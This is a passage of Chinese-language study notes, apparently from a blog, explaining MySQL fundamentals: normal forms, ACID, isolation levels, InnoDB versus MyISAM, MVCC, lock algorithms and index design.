<h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2><p>主表中没有的数据值，在副表中是不可以使用的。主表中的记录被副表引用，是不可以被删除的</p>
<h2 id="三大范式"><a href="#三大范式" class="headerlink" title="三大范式"></a>三大范式</h2><p><a href="https://zhuanlan.zhihu.com/p/20028672">https://zhuanlan.zhihu.com/p/20028672</a> </p>
<h3 id="第一范式（列不可分）"><a href="#第一范式（列不可分）" class="headerlink" title="第一范式（列不可分）"></a>第一范式（列不可分）</h3><p>定义：数据库表的每一列都是不可分割的原子数据项，而不能是集合，数组，记录等非原子数据项。如果实体中的某个属性有多个值时，必须拆分为不同的属性。</p>
<p><strong>1NF是所有关系型数据库的最基本要求</strong>，你在关系型数据库管理系统（RDBMS），例如SQL Server，Oracle，MySQL中创建数据表的时候，如果数据表的设计不符合这个最基本的要求，那么操作一定是不能成功的。</p>
<p>例如：</p>
<p>不满足第一范式</p>
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>班级</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>小红</td>
<td>高三1班</td>
</tr>
</tbody></table>
<p>改成</p>
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>年级</th>
<th>班级</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>小红</td>
<td>高三</td>
<td>1班</td>
</tr>
</tbody></table>
<h3 id="第二范式（属性完全依赖于主键）"><a href="#第二范式（属性完全依赖于主键）" class="headerlink" title="第二范式（属性完全依赖于主键）"></a>第二范式（属性完全依赖于主键）</h3><p>定义：满足第一范式前提， 当存在联合主键的时候，才会发生不符合第二范式的情况。比如有两个属性的联合主键，如果存在这样的属性，它只依赖于联合主键中的一个属性而不依赖另一个，这就是不符合第二范式的。</p>
<p>仅仅符合1NF的设计，仍然会存在数据冗余过大，插入异常，删除异常，修改异常的问题，例如：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151849658.jpg" alt="img"></p>
<p>注１：根据三种关系完整性约束中实体完整性的要求，关系中的码（注２）所包含的任意一个属性都不能为空，所有属性的组合也不能重复。为了满足此要求，图中的表，只能将学号与课名的组合作为码，否则就无法唯一地区分每一条记录。</p>
<p>注２：码：关系中的某个属性或者某几个属性的组合，用于区分每个元组（可以把“元组”理解为一张表中的每条记录，也就是每一行）。</p>
<ol>
<li>每一名学生的学号、姓名、系名、系主任这些数据重复多次。每个系与对应的系主任的数据也重复多次。——<strong>数据冗余过大</strong>。</li>
<li>假如学校新建了一个系，但是暂时还没有招收任何学生（比如3月份就新建了，但要等到8月份才招生），那么是无法将系名与系主任的数据单独地添加到数据表中去的 （注１）。——<strong>插入异常</strong>。</li>
<li>假如将某个系中所有学生相关的记录都删除，那么所有系与系主任的数据也就随之消失了（一个系所有学生都没有了，并不表示这个系就没有了）。——<strong>删除异常</strong>。</li>
<li>假如李勇转系到法律系，那么为了保证数据库中数据的一致性，需要修改三条记录中系与系主任的数据。——<strong>修改异常</strong>。</li>
</ol>
<p>修改后：</p>
<p>选课表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151854983.jpg" alt="img"></p>
<p>学生表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151854314.jpg" alt="img"></p>
<p>对于修改后的表：</p>
<ol>
<li>李小明转系到法律系<br>只需要修改一次李小明对应的系的值即可。——有改进</li>
<li>数据冗余是否减少了？<br>学生的姓名、系名与系主任，不再像之前一样重复那么多次了。——有改进</li>
<li>删除某个系中所有的学生记录<br>该系的信息仍然全部丢失。——无改进</li>
<li>插入一个尚无学生的新系的信息。<br>因为学生表的码是学号，不能为空，所以此操作不被允许。——无改进</li>
</ol>
<p>所以说，仅仅符合2NF的要求，很多情况下还是不够的，而出现问题的原因，在于仍然存在非主属性<strong>系主任</strong>对于码<strong>学号</strong>的传递函数依赖。为了能进一步解决这些问题，还需要将符合2NF要求的数据表改进为符合3NF的要求。</p>
<h3 id="第三范式（属性不能传递依赖于主键）"><a href="#第三范式（属性不能传递依赖于主键）" class="headerlink" title="第三范式（属性不能传递依赖于主键）"></a>第三范式（属性不能传递依赖于主键）</h3><p>定义：满足第二范式前提， 如果某一属性依赖于其他非主键属性，而其他非主键属性又依赖于主键，那么这个属性就是间接依赖于主键，这被称作传递依赖于主属性。</p>
<p>例如：</p>
<p>选课表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901434.jpg" alt="img"></p>
<p>学生表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901270.jpg" alt="img"></p>
<p>系表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901808.jpg" alt="img"></p>
<p>修改后：</p>
<ol>
<li>删除某个系中所有的学生记录<br>该系的信息不会丢失。——有改进</li>
<li>插入一个尚无学生的新系的信息。<br>因为系表与学生表目前是独立的两张表，所以不影响。——有改进</li>
<li>数据冗余更加少了。——有改进</li>
</ol>
<h3 id="BCNF范式"><a href="#BCNF范式" class="headerlink" title="BCNF范式"></a>BCNF范式</h3><p>要了解 BCNF 范式，那么先看这样一个问题：<br>若：</p>
<ol>
<li>某公司有若干个仓库；</li>
<li>每个仓库只能有一名管理员，一名管理员只能在一个仓库中工作；</li>
<li>一个仓库中可以存放多种物品，一种物品也可以存放在不同的仓库中。每种物品在每个仓库中都有对应的数量。</li>
</ol>
<p>那么关系模式仓库（仓库名，管理员，物品名，数量） 属于哪一级范式？</p>
<p>答：已知函数依赖集：仓库名 → 管理员，管理员 → 仓库名，（仓库名，物品名）→ 数量<br>码：（管理员，物品名），（仓库名，物品名）<br>主属性：仓库名、管理员、物品名<br>非主属性：数量<br>∵ 不存在非主属性对码的部分函数依赖和传递函数依赖。∴ 此关系模式属于3NF。</p>
<p>基于此关系模式的关系（具体的数据）可能如图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151906491.jpg" alt="img"></p>
<p>好，既然此关系模式已经属于了 3NF，那么这个关系模式是否存在问题呢？我们来看以下几种操作：</p>
<ol>
<li>先新增加一个仓库，但尚未存放任何物品，是否可以为该仓库指派管理员？——不可以，因为物品名也是主属性，根据实体完整性的要求，主属性不能为空。</li>
<li>某仓库被清空后，需要删除所有与这个仓库相关的物品存放记录，会带来什么问题？——仓库本身与管理员的信息也被随之删除了。</li>
<li>如果某仓库更换了管理员，会带来什么问题？——这个仓库有几条物品存放记录，就要修改多少次管理员信息。</li>
</ol>
<p>从这里我们可以得出结论，在某些特殊情况下，即使关系模式符合 3NF 的要求，仍然存在着插入异常，修改异常与删除异常的问题，仍然不是 ”好“ 的设计。</p>
<p>造成此问题的原因：存在着<strong>主属性</strong>对于码的部分函数依赖与传递函数依赖。（在此例中就是存在主属性【仓库名】对于码【（管理员，物品名）】的部分函数依赖。</p>
<p>解决办法就是要在 3NF 的基础上消除<strong>主属性</strong>对于码的部分与传递函数依赖。</p>
<p>仓库（仓库名，管理员）<br>库存（仓库名，物品名，数量）</p>
<p>这样，之前的插入异常，修改异常与删除异常的问题就被解决了。</p>
<h2 id="事务四大特性（ACID）"><a href="#事务四大特性（ACID）" class="headerlink" title="事务四大特性（ACID）"></a>事务四大特性（ACID）</h2><h3 id="事务的理解"><a href="#事务的理解" class="headerlink" title="事务的理解"></a>事务的理解</h3><p>事务的产生，是为了当应用程序访问数据库的时候，事务能够简化我们的编程模型，不需要我们去考虑各种各样的潜在错误和并发问题。当我们使用事务时，要么提交，要么回滚，不用考虑网络异常，服务器宕机了，同时更改一个数据这些情况。<strong>因此事务本质上是为了应用层服务的</strong>，而不是伴随着数据库系统天生就有的。</p>
<h4 id="数据库为什么要有事务？"><a href="#数据库为什么要有事务？" class="headerlink" title="数据库为什么要有事务？"></a>数据库为什么要有事务？</h4><p>为了保证数据的最终一致性。</p>
<h3 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h3><ul>
<li>原子性（Automicity）：满足原子操作单元，对数据的操作，要么全部执行，要么全部失败（通过undo log来保证）。</li>
<li>一致性（Consistency）： 应用系统从一个正确的状态到另一个正确的状态。而ACID就是说事务能够通过AID来保证这个C的过程。C是目的，AID都是手段。</li>
<li>隔离性（Isolation）： 事务之间时相互独立的，中间状态对外不可见。 隔离状态执行事务，使它们好像是系统在给定时间内执行的唯一操作。如果有两个事务，运行在相同的时间内，执行相同的功能，事务的隔离性将确保每一事务在系统中认为只有该事务在使用系统。这种属性有时称为串行化，为了防止事务操作间的混淆，必须串行化或序列化请求，使得在同一时间仅有一个请求用于同一数据。</li>
<li>持久性（Durability）： 数据的修改是永久的，即使数据库发生故障。</li>
</ul>
<h4 id="一致性的理解"><a href="#一致性的理解" class="headerlink" title="一致性的理解"></a>一致性的理解</h4><p>ACID里的AID都是数据库的特征，依赖数据库的具体实现。而这个C，它依赖于应用层，也就是依赖于开发者。这里的一致性是指系统从一个正确的状态，迁移到另一个正确的状态（当前的状态满足预定的约束）。事务具备ACID里C的特性是说通过事务的AID来保证一致性。</p>
<p>例如：</p>
<blockquote>
<p>我们提到保镖会说强壮、好功夫和踏实。这里强壮、好功夫和踏实都是保镖自己的特征，而安全是属于你的，而你通过保镖的特征来保护你的安全。</p>
</blockquote>
<p>我们能够通过AID保证我们的一致性，但事务本身没办法确保。用上面保镖的例子来说，你正常被保护一定是安全的，但是你故意骗保镖离开你身边，然后你自己溜出去玩就不安全了。同样，如果你在事务里故意写出违反约束的代码，比如在银行系统里定时每天给自己的账户打入100w，这个事务是没办法的。</p>
<p>例如：</p>
<blockquote>
<p>A要向B支付100元，而A的账户中只有90元，并且给定账户余额这一列的约束是不能小于0。那么这条事务执行会失败，因为90-100&#x3D;-10，小于给定的约束。</p>
</blockquote>
<p>这个例子里，支付之前数据库里的数据都是符合约束的，但是如果事务执行成功了，数据库的数据就破坏约束了，因此事务不能成功，事务提供了一致性的保证。</p>
<p>例如：</p>
<blockquote>
<p>A要向B支付100元，而A的账户中只有90元，账户余额列没有任何约束。但是业务上不允许账户余额小于0。因此支付完成后业务上会检查A的账户余额，发现余额小于0了，于是业务上进行了事务的回滚。</p>
</blockquote>
<p>这个例子里，如果事务执行成功，虽然没有破坏数据库的约束，但是破坏了应用层的约束。而事务的回滚保证了数据库的约束，因此也可以说事务提供了一致性保证（ps：事实上，是应用层利用事务回滚保证了约束不被破坏）。</p>
<p>例如：</p>
<blockquote>
<p>A要向B支付100元，而A的账户中只有90元，账户余额列没有任何约束。然后支付成功了。</p>
</blockquote>
<p>这个例子里，直观上账户余额为什么能为负呢？但这里事务执行前和执行后，系统没有任何的约束被破坏。一直都是保持正确的状态。</p>
<p>综上，可以理解一致性就是：应用系统从一个正确的状态到另一个正确的状态。而ACID就是说事务能够通过AID来保证这个C的过程。C是目的，AID都是手段。</p>
<h2 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h2><h3 id="并发出现的问题"><a href="#并发出现的问题" class="headerlink" title="并发出现的问题"></a>并发出现的问题</h3><ul>
<li>脏读（dirty read）： A事务还没提交，B事务就读到了A事务的结果。（破坏了隔离性）</li>
<li>丢失修改（Lost to modify）：事务1读取某表中的数据 A &#x3D; 20，事务2也读取 A &#x3D; 20，事务1修改A &#x3D; A - 1，事务2也修改 A &#x3D; A - 1，最终结果A&#x3D;19，事务1的修改丢失了。</li>
<li>不可重复读（Unrepeatableread）： 针对其提交前后，读取数据本身的对比。A事务在本次事物中，对自己未操作过的数据，进行了多次读取，结果出现了不一致情况。(破坏了一致性，update)</li>
<li>幻读（Phantom read）：针对其提交前后，读取数据条数的对比。同样一笔查询在整个事务过程中多次执行后，数据总量不一致。 A事务在本次事务中，对自己未操作过的数据，进行了多次读取，第一次读取时，数据总量100条，第二次读取时，数据总量200条。(破坏了一致性，delete)</li>
</ul>
<h3 id="解决方案-制定标准"><a href="#解决方案-制定标准" class="headerlink" title="解决方案(制定标准)"></a>解决方案(制定标准)</h3><p>读取未提交（READ-UNCOMMITTED）：最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读。</p>
<p>读取已提交（READ-COMMITTED）：允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生。事务1在事务2提交前读取 A &#x3D; 20，在事务2提交后读取 A &#x3D; 19，不可重复读。 假设A刚开始不存在，事务1读取记录不存在，事务2提交后，事务1又读取到了A，幻读。</p>
<p>可重复读（REPEATABLE-READ）：对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。假设 A 刚开始不存在，事务1读取记录不存在，事务2将A插入然后提交，事务1又读取到A，幻读。</p>
<p>可串行化（SERIALIZABLE）：最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>READ-UNCOMMITTED</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>READ-COMMITTED</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>REPEATABLE-READ</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>SERIALIZABLE</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<h3 id="实现-Innodb"><a href="#实现-Innodb" class="headerlink" title="实现(Innodb)"></a>实现(Innodb)</h3><ul>
<li><p>锁机制：阻止其他事务对数据进行操作，各个隔离级别主要体现在读取数据时加的锁和释放时机。</p>
<ul>
<li>RU：事务读取的时候，不加锁。</li>
<li>RC：事务读取的时候加行级共享锁（读到才加锁，加锁后必须等其他事务提交后才会执行）， 一旦读完，立刻释放（并不是事务结束）。</li>
<li>RR：事务读取时加行级共享锁，直到事务结束才释放。</li>
<li>SE：事务读取时加表级共享锁，直到事务结束时才会释放。</li>
</ul>
</li>
<li><p>多版本并发控制（Multiversion Concurrency Control，MVCC）机制（Innodb默认开启）：生成一个数据快照，并用这个快照来提供一定级别的一致性的读取，也称为多版本数据控制。</p>
<ul>
<li>实际上就是CAS版本控制和读写分离的思想</li>
<li>主要作用于RC和RR级别</li>
</ul>
</li>
</ul>
<h2 id="MyISAM和InnoDB"><a href="#MyISAM和InnoDB" class="headerlink" title="MyISAM和InnoDB"></a>MyISAM和InnoDB</h2><p>如果某个进程想要获取读锁，同时另外一个进程想要获取写锁。在MySQL中，写锁是优先于读锁的。写锁和读锁优先级的问题是可以通过参数调节的：max_write_lock_count和low-priority-updates。</p>
<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><ul>
<li>MYISAM表级锁</li>
<li>不支持事务</li>
<li>不支持外键</li>
<li>不支持数据库异常崩溃后的安全恢复</li>
<li>不支持MVCC</li>
</ul>
<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><ul>
<li><p>InnoDB只有通过索引条件检索数据才使用行级锁，否则，InnoDB使用表锁。也就是说，InnoDB的行锁是基于索引的。</p>
</li>
<li><p>Innodb支持行锁和表锁，默认为行级锁。 </p>
</li>
<li><p>支持事务，并且具有提交（commit）和回滚（rollback）事务的能力。</p>
</li>
<li><p>支持外键（不建议使用）。</p>
</li>
<li><p>支持数据库异常崩溃后的安全恢复，发生异常崩溃后，数据库重新启动的时候会保证数据库恢复到崩溃前的状态，这个恢复依赖于redo log。</p>
</li>
<li><p>支持MVCC，MVCC可以看作是行级锁的一个升级，可以有效减少加锁操作，提升性能。</p>
</li>
<li><p>在分布式事务的情况下一般会用到SERIALIZABLE（可串性化）隔离级别。</p>
</li>
<li><p>MySQL InnoDB引擎使用redo log保证事务的持久性，使用undo log来保证事务的原子性。</p>
</li>
<li><p>MySQL InnoDB引擎通过锁机制、MVCC等手段来保证事务的隔离性（默认的隔离级别是REPEARTABLE-READ）。</p>
</li>
</ul>
<h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a><a href="https://blog.csdn.net/whoamiyang/article/details/51901888?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&dist_request_id=1331645.10885.16183849906828127&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">MVCC</a></h3><p>读不加锁，读写不冲突。大多数情况下可以代替行级锁。</p>
<p>MVCC是通过在每行记录后面保存两个隐藏的列来实现。这两个列，一个保存了行的创建时间，一个保存行的过期时间（或删除时间）。 当然存储的并不是实际的时间值，而是系统版本号。每开始一个新的事务，系统版本号都会自动递增。事务开始时刻的系统版本号会作为事务的版本号，用来和查询到的每行记录的版本号进行比较。</p>
<p>在REPEATABLE READ隔离级别下，MVCC具体操作如下：</p>
<ol>
<li>SELECT</li>
</ol>
<p>InnoDB会根据以下两个条件检查每行记录：</p>
<ul>
<li><p>InnoDB只会查找版本早于当前事务版本的数据行（也就是，行的系统版本号小于或等于事务的系统版本号），这样可以确保事务读取的行要么是在事务开始前已经存在的，要么是事务自身插入或者修改过的。</p>
</li>
<li><p>行的删除版本号要么未定义，要么大于当前事务版本号，这可以确保事务读取到的行，在事务开始之前未被删除。</p>
</li>
</ul>
<p>只有同时满足的记录，才能返回作为查询结果。</p>
<p>MVCC可以解决这种场景的幻读问题，例如事务1的事务版本号ñ为1， 事务2的事务版本号为2。事务2第一次查询是有100条记录， 然后事务1添加了100条数据，这些数据的版本号是当前系统版本号（假设为3），此时事务2再去查询的话也只能查询出100条数据，因为当前系统版本号（3）大于事务2的事务版本号（2）。</p>
<ol start="2">
<li>INSERT</li>
</ol>
<p>InnoDB为新插入的每一行保存当前系统版本号（注意不是事务版本号）作为版本号。</p>
<ol start="3">
<li>DELETE</li>
</ol>
<p>InnoDB会为删除的每一行保存当前系统的版本号（注意不是事务版本号）作为删除标识.</p>
<ol start="4">
<li>UPDATE</li>
</ol>
<p>InnoDB执行UPDATE，实际上是新插入了一行记录，并保存其创建时间为当前系统版本号（注意不是事务版本号），同时保存当前系统版本号到要UPDATE的行的删除时间。</p>
<h3 id="InnoDB存储引擎的3种锁算法"><a href="#InnoDB存储引擎的3种锁算法" class="headerlink" title="InnoDB存储引擎的3种锁算法"></a>InnoDB存储引擎的3种锁算法</h3><h4 id="记录锁（Record-lock）"><a href="#记录锁（Record-lock）" class="headerlink" title="记录锁（Record lock）"></a>记录锁（Record lock）</h4><p>记录锁就是为某行记录加锁，基于唯一索引，事实上，它封锁的是该行的索引记录。如果表在建立的时候没有设置任何一个索引，那么 InnoDB 存储引擎会使用 “隐式的主键” 来进行锁定。</p>
<p>隐式的主键就是指：如果在建表的时候没有指定主键，InnoDB 存储引擎会将第一列非空的列作为主键；如果没有的话会自动生成一列为 6 字节的主键。</p>
<p>如果我们的 SQL 语句中的条件导致索引失效（比如使用 or） 或者说条件根本就不涉及索引或者主键，行级锁就将退化为表锁。</p>
<h5 id="两条不同记录拥有相同的索引，会发生锁冲突吗？"><a href="#两条不同记录拥有相同的索引，会发生锁冲突吗？" class="headerlink" title="两条不同记录拥有相同的索引，会发生锁冲突吗？"></a>两条不同记录拥有相同的索引，会发生锁冲突吗？</h5><p>行锁锁住的是索引，而不是一条记录（只不过我们平常这么说锁住了哪条记录，比较好理解罢了）。所以如果两个事务分别操作的两条不同记录拥有相同的索引，某个事务会因为行锁被另一个事务占用而发生等待。例如两条记录里年龄字段都为20，年龄字段有索引。</p>
<h4 id="间隙锁（Gap-Lock）"><a href="#间隙锁（Gap-Lock）" class="headerlink" title="间隙锁（Gap Lock）"></a>间隙锁（Gap Lock）</h4><p>基于非唯一索引，锁定一个范围，不包括记录本身。 在可重复读提交下为了解决幻读问题时引入的锁机制。 </p>
<p>Gap Lock 和 Next-Key Lock 锁定的都是一段范围内的索引记录：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">10</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>

<p>对于上述 SQL 语句，所有在（1，10）区间内（左开右开）的记录行都会被 Gap Lock 锁住，所有 id 为 2、3、4、5、6、7、8、9 的数据行的插入会被阻塞，但是 1 和 10 两条被操作的索引记录并不会被锁住。</p>
<h4 id="临键锁（Next-key-lock）"><a href="#临键锁（Next-key-lock）" class="headerlink" title="临键锁（Next-key lock）"></a>临键锁（Next-key lock）</h4><p>基于非唯一索引，行锁和间隙锁的组合，锁定一个范围，包含记录本身。 对于行查询，都是采用该方法，主要目的是为了解决幻读问题。</p>
<p>例如一个索引有 10，11，13 和 20 这四个值，分别对这个 4 个索引进行加锁操作，那么这四个操作分别对应的 Next-Key Lock 锁住的区间是：</p>
<ul>
<li>(-∞, 10]</li>
<li>(10, 11]</li>
<li>(11, 13]</li>
<li>(13, 20]</li>
<li>(20, +∞]</li>
</ul>
<p>和 Gap Lock 的不同之处就在于，Next-Key Lock 锁定的区间是左开右闭的，也就是说它是包含当前被操作的索引记录的。</p>
<p>在 InnoDB 默认的隔离级别 REPEATABLE-READ 下，行锁默认使用的算法就是 Next-Key Lock。但是，如果操作的索引是唯一索引或主键，InnoDB 会对 Next-Key Lock 进行优化，将其降级为 Record Lock，即仅锁住索引本身，而不是范围。</p>
<p>由于主键也是一种唯一索引，所以我们可以这么说：Record Lock 是基于唯一索引的，而 Next-Key Lock 是基于非唯一索引的。</p>
<p>需要注意的，当操作的索引为非唯一索引时，InnoDB 会先用 Record Lock 锁住对应的唯一索引，再用 Next-Key Lock 和 Gap Lock 对这个非唯一索引进行处理，而不仅仅是锁住这个非唯一索引。</p>
<p>例如：</p>
<h2 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h2><p>执行查询语句的时候,会先查询缓存; 不过在MySQL8.0版本后移出该功能;开启查询缓存后在同样的查询条件以及数据情况下,会直接在缓存中返回结果. 缓存虽然能够提升数据库的查询性能,但是缓存同时也带来了额外的开销,每次查询后都要做一次缓存操作,失效后还要销毁. 对于写密集的应用最好不要开启.</p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>通过<strong>唯一性索引</strong>,可以保证数据库中每一行数据的唯一性; 可以大大加快数据的检索速度; 帮助服务器避免排序和临时表; 将随机IO变为顺序IO;</p>
<h3 id="为什么不对表中的每一个列创建一个索引"><a href="#为什么不对表中的每一个列创建一个索引" class="headerlink" title="为什么不对表中的每一个列创建一个索引?"></a>为什么不对表中的每一个列创建一个索引?</h3><p>表中数据增删和修改的时候,索引也要动态的维护,索引太多会降低数据的维护速度; 索引需要占用空间, 如果要建立聚族索引,那么需要的空间就会更大; </p>
<p><strong>聚簇索引</strong>就是按照每张表的主键构造一颗B+树，同时叶子节点中存放的就是整张表的行记录数据，也将聚簇索引的叶子节点称为数据页。这个特性决定了索引组织表中数据也是索引的一部分，每张表只能拥有一个聚簇索引。</p>
<p>Innodb通过主键聚集数据，如果没有定义主键，innodb会选择非空的唯一索引代替。如果没有这样的索引，innodb会隐式的定义一个主键来作为聚簇索引。</p>
<h3 id="使用索引的注意事项"><a href="#使用索引的注意事项" class="headerlink" title="使用索引的注意事项"></a>使用索引的注意事项</h3><p>在经常需要搜索的列上,可以加快搜索速度; </p>
<p>在经常使用where子句的列上; </p>
<p>在经常需要排序的列上; </p>
<p>对于中到大型表索引都是非常有效的,但是特大表的话维护开销会很大,不适合建索引; </p>
<p>在经常用于连接的列上,这些列主要是一些外键,可以加快连接的速度; </p>
<p>避免where子句对字段施加函数,这会造成无法命中索引; </p>
<p>在使用InnoDB是使用于业务无关的自增主键作为主键,即使用逻辑主键,而不要使用业务主键; </p>
<p>将某一列设置为default null,where 是可以走索引的,另外索引列是否设置null是不会影响性能的. 但是,最好设置为not null, 因为null需要更多的存储空间并且null值无法参与某些运算; </p>
<p>删除长期未使用的索引,不用的索引的存在会造成不必要的性能损耗 MySQL 5.7 可以通过查询 sys 库的 schema_unused_indexes 视图来查询哪些索引从未被使用; </p>
<p>在使用limit offset查询缓慢时,可以借助索引来提高性能; </p>
<p>对于那些在查询中很少使用或者参考的列不应该创建索引。这是因为，既然这些列很少使用到，因此有索引或者无索引，并不能提高查询速度。相反，由于增加了索引，反而降低了系统的维护速度和增大了空间需求。</p>
<p>对于那些只有很少数据值的列也不应该增加索引。这是因为，由于这些列的取值很少，例如人事表的性别列，在查询的结果中，结果集的数据行占了表中数据行的很大比例，即需要在表中搜索的数据行的比例很大。增加索引，并不能明显加快检索速度。</p>
<p>对于那些定义为text, image和bit数据类型的列不应该增加索引。这是因为，这些列的数据量要么相当大，要么取值很少。</p>
<p>当修改性能远远大于检索性能时，不应该创建索引。这是因为，<strong>修改性能和检索性能是互相矛盾的</strong>。当增加索引时，会提高检索性能，但是会降低修改性能。当减少索引时，会提高修改性能，降低检索性能。因此，当修改性能远远大于检索性能时，不应该创建索引。</p>
<h3 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h3><p>底层为哈希表,在绝大多数需求为单条查询时,可以选择哈希索引,查询速度最快;</p>
<h3 id="B-树索引"><a href="#B-树索引" class="headerlink" title="B+树索引"></a>B+树索引</h3><p>MyISAM: 叶节点存放的事数据记录的地址. 在索引检索时,首先按照b+tree搜索索引,如果key存在,则取出data域的值,然后以data域的值为地址读取对应的数据记录. 这被称为非聚簇索引;</p>
<p>InnoDB: 其数据文件本身就是索引文件. 树的叶节点data域保存了完整的数据记录. 这个索引的key是数据库的主键,因此InnoDB表数据文件本身就是主索引. 这被称为聚簇索引; 其余索引都是辅助索引,辅助索引的data域存的时主键的值而不是地址; 在根据主索引搜索时,直接找到key所在的节点即可取出数据; 在根据辅助索引查找时,则需要先取出主键的值,再走一遍索引; 因此,在设计表时,不建议使用过长的字段作为主键,也不建议使用非单调的字段作为主键,这样会造成主索引频繁分裂;</p>
<p>缺点: 会产生大量随机io, 主键不是有序递增的话, 导致每次插入数据产生大量的数据迁移和空间碎片. 即使主键是有序递增, 大量写请求的分布仍然是随机的;</p>
<h3 id="局部性原理与磁盘预读"><a href="#局部性原理与磁盘预读" class="headerlink" title="局部性原理与磁盘预读"></a>局部性原理与磁盘预读</h3><p>由于存储介质的特性，磁盘本身存取就比主存慢很多，再加上机械运动耗费，磁盘的存取速度往往是主存的几百分分之一，因此为了提高效率，要尽量减少磁盘I&#x2F;O。为了达到这个目的，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。这样做的理论依据是计算机科学中著名的<strong>局部性原理</strong>：<strong>当一个数据被用到时，其附近的数据也通常会马上被使用。程序运行期间所需要的数据通常比较集中。</strong></p>
<p>由于磁盘顺序读取的效率很高（不需要寻道时间，只需很少的旋转时间），因此对于具有局部性的程序来说，预读可以提高I&#x2F;O效率。</p>
<p>预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。</p>
<h3 id="数据库在磁盘中如何存储？"><a href="#数据库在磁盘中如何存储？" class="headerlink" title="数据库在磁盘中如何存储？"></a>数据库在磁盘中如何存储？</h3><p>以Innodb引擎为准; 简单的说，按照表空间、段、簇、页进行存储。</p>
<p>当新建一个表，就会在磁盘上新建一个表空间（逻辑概念），用于存储数据。</p>
<p>一个表空间中包含多个段，包括叶子节点段（数据段），非叶子节点段（索引段），回滚段（保证数据完整性）。在Innodb引擎中，数据以索引组织，即聚簇索引，新建一个索引，在表空间中会同时建立数据段和索引段。</p>
<p>一个段又包括多个簇。簇是构成段的基本元素，一个段由若干个簇构成。一个簇是物理上连续分配的一个段空间，每一个段至少会有一个簇，在创建一个段时会创建一个默认的簇。如果存储数据时，一个簇已经不足以放下更多的数据，此时需要从这个段中分配一个新的簇来存放新的数据。一个段所管理的空间大小是无限的，可以一直扩展下去，但是扩展的最小单位就是簇。</p>
<p>一个簇由64个连续的页组成。每个页大小为16KB，即每个簇的大小为1MB。页可以理解为簇的细化，在逻辑（页面号连续递增）和物理上页的存储都是连续的，在向表中插入数据时，如果一个页面已经被写完，系统会从当前簇中分配一个新的空闲页面处理使用，如果当前簇中的64个页面都被分配完，系统会从当前页面所在段中分配一个新的簇，然后再从这个簇中分配一个新的页面来使用。</p>
<h3 id="Mysql为什么使用b-树，而不是b树、二叉树、AVL树或红黑树？"><a href="#Mysql为什么使用b-树，而不是b树、二叉树、AVL树或红黑树？" class="headerlink" title="Mysql为什么使用b+树，而不是b树、二叉树、AVL树或红黑树？"></a>Mysql为什么使用b+树，而不是b树、二叉树、AVL树或红黑树？</h3><ol>
